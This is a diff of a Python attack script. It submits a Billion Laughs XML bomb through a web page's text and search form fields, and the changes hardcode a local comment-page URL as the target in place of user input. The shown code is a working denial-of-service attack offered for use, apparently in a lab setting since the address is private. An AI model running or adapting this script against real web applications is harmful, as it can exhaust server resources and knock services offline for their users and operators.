@@ -38,10 +38,12 @@ def submit_xmlbomb(url, form_details):
 
     url_params = {}  # data from the XML file that will be sent in the request
 
-    bomb = xml.dom.minidom.parse(BillionLaughsAttack.xml)
-
+    bomb = minidom.parse('./BillionLaughsAttack.xml')
+    #prettyxml = bomb.toprettyxml()
+    #print(prettyxml)
+    #print("la", bomb)
     elements = bomb.getElementsByTagName("bomb")
-
+    #elements= "&j;"
     for one_input in input_tags:
         one_input_type = one_input["type"]
         if one_input_type == "text" or one_input_type == "search":
@@ -75,6 +77,6 @@ def lunch_attack(url):
     return "Attack lunched"
 
 if __name__ == "__main__":
-    url = input()
+    url = "http://192.168.1.2:8080/comment.php" #input()
     print(lunch_attack(url))
 
